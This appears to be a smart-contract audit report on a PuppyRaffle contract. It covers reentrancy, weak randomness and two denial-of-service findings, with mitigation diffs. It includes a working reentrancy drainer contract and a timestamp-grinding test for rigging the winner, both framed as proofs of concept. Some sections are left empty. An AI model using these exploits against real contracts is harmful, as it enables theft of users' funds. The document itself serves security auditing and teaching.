### [H-1] Invoking `PuppyRaffle::refund` allows active users to execute a reentrancy attack on the contract due to the lack of Check-Effects-Interactions (CEI) pattern implementation. This vulnerability occurs when returning the `entranceFee` to the user, enabling a potential reentrancy exploit. 

**Description:** A malicious active user can repeatedly reenter the `PuppyRaffle::refund` function, draining the contract of all funds. This vulnerability exists because the user's `entranceFee` is refunded before updating the state of their `entranceFee`.

``` solidity 
        payable(msg.sender).sendValue(entranceFee);
        // refunding the entranceFee before updating the state 
-->     players[playerIndex] = address(0);

```


**Impact:** Reentering into the contract can result in a loss of funds, affecting end users monetarily and damaging the protocol's finances and reputation. 

**Proof of Concept:** The active threat actor can successfully reenter into `PuppyRaffle::refund` by creating a malicious contract stealing all funds:

<details>
<summary>Malicious Contract</summary>

``` solidity 
        contract Reentrancy {
            PuppyRaffle puppyRaffle;   

            uint256 entranceFee;
            uint256 attackerIndex;

            constructor(PuppyRaffle _puppyRaffle) {
                puppyRaffle = _puppyRaffle;
                entranceFee = puppyRaffle.entranceFee();
            }

            receive() external payable {
                if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex);    
                }
            }

            function attack() public payable {
                address[] memory players = new address[](1);
                players[0] = address(this);

                // enter the raffle 
                puppyRaffle.enterRaffle{value: entranceFee}(players);

                // get the player index
                attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
                
                // call refund function 
                // as refund is called it will invoke the receive function inside this contract 
                puppyRaffle.refund(attackerIndex);        
            }
        }

```


</details>

<details>
<summary>PoC</summary>

``` solidity 
        function testReentrancy() public {
            // creating players
            address[] memory players = new address[](4);
            players[0] = address(5);
            players[1] = address(6);
            players[2] = address(7);
            players[3] = address(8);
            
            // entering the raffle 
            puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

            // creating new attacker contract 
            Reentrancy attackerContract = new Reentrancy(puppyRaffle);
            address badPlayer = makeAddr("badPlayer");
            deal(badPlayer, 1 ether);

            uint256 startingAttackerbalance = address(attackerContract).balance;
            uint256 startingContractBalancce = address(puppyRaffle).balance;

            // reentrancy exe
            vm.prank(badPlayer);
            attackerContract.attack{value: entranceFee}();

            // logging
            console.log("starting attacker contract balance: %s", startingAttackerbalance);
            console.log("starting contract balance: %s", startingContractBalancce);

            console.log("ending attacker contract balance: %s", address(attackerContract).balance);
            console.log("ending contract balance: %s", address(puppyRaffle).balance);
        }

```


</details>

**Recommended Mitigation:** There are three primary options to resolve reentrancy from occuring within `PuppyRaffle::refund`. 

 


<summary>1. Implement Check-Effects-Interactions (CEI) pattern:</summary>

``` diff 
        function refund(uint256 playerIndex) public {
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

+           players[playerIndex] = address(0);
            payable(msg.sender).sendValue(entranceFee);

-           players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
        }

```




 
<summary>2. Implement a locking mechanism to PuppyRaffle::refund:</summary>

``` diff 
+        error PuppyRaffle__lockedFunction();
+        bool locked = false;

        function refund(uint256 playerIndex) public {
+           if (locked) { revert PuppyRaffle__lockedFunction(); }
+           locked = true;
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            payable(msg.sender).sendValue(entranceFee);
            players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);

+           // Unlock the function after execution
+           locked = false;
        }


```



<summary>3. Leveraging existing libraries from trust sources like OpenZeppelin's ReentrancyGuard:</summary>

``` diff 
+        function refund(uint256 playerIndex) public  nonReentrant {
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

            payable(msg.sender).sendValue(entranceFee);
            players[playerIndex] = address(0);
            emit RaffleRefunded(playerAddress);
        }

```




### [H-2] Insecure randomness in `PuppyRaffle::selectWinner` allows for winner manipulation. By exploiting vulnerable randomness when selecting the winner on-chain via block.timestamp, an active user can predict and potentially influence who will be the next winner by gathering the correct parameters.

**Description:** Using on-chain randomization introduces predictability when selecting the winner. 

``` solidity 
        // @vuln: usess insecure randomness 
        uint256 winnerIndex =
            uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;

```


**Impact:** The winner can be manipulated due the usage of `block.timestamp` and `block.difficulty`. Allowing, for unfair loss of funds. 


**Proof of Concept:** Relying on `block.timestamp` & `block.difficulty` introduces the risk of predictability if an attacker controls transaction timing or if they are a miner.

Using `msg.sender` allows the caller to mine for favorable addresses, compromising the system's randomness.

The following PoC simulates a raffle with 100 participants. The goal is to manipulate the outcome so that address 26 becomes the designated winner. By determining the precise `block.timestamp` and applying it to the winner-selection equation, we can call `PuppyRaffle::selectWinner` and confirm that address 26 indeed wins the raffle. 
```
    Logs:
    Starting balance of address 26 balance: 0
    Malicious Timestamp: 86413
    Expected winner index: 26
    Address of expected winner: 0x000000000000000000000000000000000000001a
    Number of attempts to find the expected winner: 12
    Actual Winner: 0x000000000000000000000000000000000000001a
    Ending balance of address 26: 80000000000000000000

```

<details>
<summary>PoC</summary>

``` solidity 

        function test100Randomness() public returns (bool, address) {
            
            uint256 predictWinnerIndex;
            uint256 numberOfAttempts = 0;
            uint256 numberOfPlayers = 100; 

            address predictWinner;
            address expectedWinner;
                     
            console.log("Starting balance of address 26: %s", address(payable(26)).balance);

            // creating players
            address[] memory players = new address[](numberOfPlayers);
            // create 100 unique address
            for (uint256 i; i < players.length; i++) {
                players[i] = address(payable(i));
            }
            uint256 playerLength = players.length;

            // entering the raffle
            puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

            // calc the end time
            uint256 raffleEndTime = puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration();

            for (uint256 i = 0; i < 1000; i++) {
                // used to discover the number of attempts to discover the winner
                numberOfAttempts++;

                // with each iteration, the testTimestamp is incremented by 1 + i
                uint256 testTimestamp = raffleEndTime + 1 + i;
                // updating the current timestamp with each iteration
                vm.warp(testTimestamp); 

                // discovered timestamp is applied to the equation 
                uint256 expectedWinnerIndex = uint256(keccak256(abi.encodePacked(address(this), testTimestamp, block.difficulty))) % playerLength;

                // get the address of the expected winner 
                expectedWinner = players[expectedWinnerIndex];

                // making sure the expected winner matches the desired address to win!!!
                if (expectedWinner == players[26]) {
                    console.log("Malicious Timestamp: %s", testTimestamp);
                    console.log("Expected winner index: %s", expectedWinnerIndex);
                    console.log("Address of expected winner: %s", expectedWinner);
                    console.log("Number of attempts to find the expected winner: %s", numberOfAttempts);

                    vm.prank(address(this));
                    puppyRaffle.selectWinner();

                    address actualWinner = puppyRaffle.previousWinner();
                    console.log("Actual Winner: %s", actualWinner);

                    assertEq(actualWinner, expectedWinner, "Address 26 did not win");
                    break; 
                }
            }
            console.log("Balance of address 26: %s", address(expectedWinner).balance);
        }


```


</details>

**Recommended Mitigation:** The most popular method to mitigate weak randomness is to offload the computation off-chain and leverage Chainlink VRF (Verifiable Random Function). 

Chainlink VRF allows for the output of the randomization to be mathatically safe via RNG (Random Number Generator). 


<details>
<summary>PoC Pending...</summary>

``` diff 


```
</details>











---


### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` causes a Denial of Service Attack (DoS), incrementing gas costs for futher entrants. 

**Description:** The `PuppyRaffle::enterRaffler` function loops through the `PuppyRaffle::players` array to check for duplicate address entries. If a duplicate is found, the function reverts. However, there's no limit set on the `PuppyRaffle::players` array size. This causes gas costs to increase as more players are added, potentially rendering the function inoperable due to significant gas increases. 
``` solidity
        // @vuln: check if the duplicate check will cause a DOS | more than likly high gas consumption
        // Check for duplicates
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raffle entrants will significantly increase as more players join the raffle. This discourages later users from entering and causes a rush at the start of a raffle to be among the first entrants in the queue. 

**Proof of Concept:** If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6252047
- 2nd 100 players: ~18068137
This more than 3x more expensive for the second 100 players


<details>
<summary>PoC</summary>

``` solidity 
    function testEnterRaffleDoS() public {
            // starting gas price to 1
            vm.txGasPrice(1);

            uint256 playersNum = 100;
            address[] memory players = new address[](playersNum);
            // this will alow us to create unique address
            for (uint256 i; i < playersNum; i++) {
                players[i] = address(i);
            }

            uint256 initialGas = gasleft();
            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
            uint256 postGas = gasleft();

            uint256 gasForTheFirst100 = (initialGas - postGas) * tx.gasprice;
            console.log("Post Gas 100: %s", gasForTheFirst100);


            address[] memory playersTwo = new address[](playersNum);
            // this will alow us to create unique address
            for (uint256 i; i < playersNum; i++) {
                playersTwo[i] = address(i + playersNum);
            }


            uint256 initialGas200 = gasleft();
            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(playersTwo);
            uint256 postGas200 = gasleft();

            uint256 gasForTheFirst200 = (initialGas200 - postGas200) * tx.gasprice;
            console.log("Post Gas 200: %s", gasForTheFirst200);

            assert(gasForTheFirst100 < gasForTheFirst200);

        }
```

</details>


**Recommended Mitigation:** Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a uint256 id, and the mapping would be a player address mapped to the raffle Id.

``` diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");

```

### [M-2] 

**Description:** DOS `PuppyRaffle::withdrawFees` 

``` solidity 
        // @vuln: strict equality is specified causing a potential DoS
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

```


**Impact:** 

**Proof of Concept:** 

<details>
<summary>PoC</summary>

``` solidity 
    function testFeeDos() public returns(uint256){
        // create users 
        address[] memory players = new address[](4);
        players[0] = address(payable(1));
        players[1] = address(payable(2));
        players[2] = address(payable(3));
        players[3] = address(payable(4));

        // enter the users to the raffle 
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);

        // warp time and block to the end of the raffle 
        uint256 endTime = puppyRaffle.raffleStartTime() + puppyRaffle.raffleDuration();
        vm.warp(endTime);
        vm.roll(endTime + 1);

        // selecting the winner 
        puppyRaffle.selectWinner();

        uint256 fees = puppyRaffle.totalFees();      

        vm.deal(address(puppyRaffle), address(puppyRaffle).balance + 1 ether);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();

        console.log("The fee balance     : %s", fees);
        console.log("The contract balance: %s", address(puppyRaffle).balance);
    }

```


</details>

**Recommended Mitigation:** 

``` diff

``` 


---
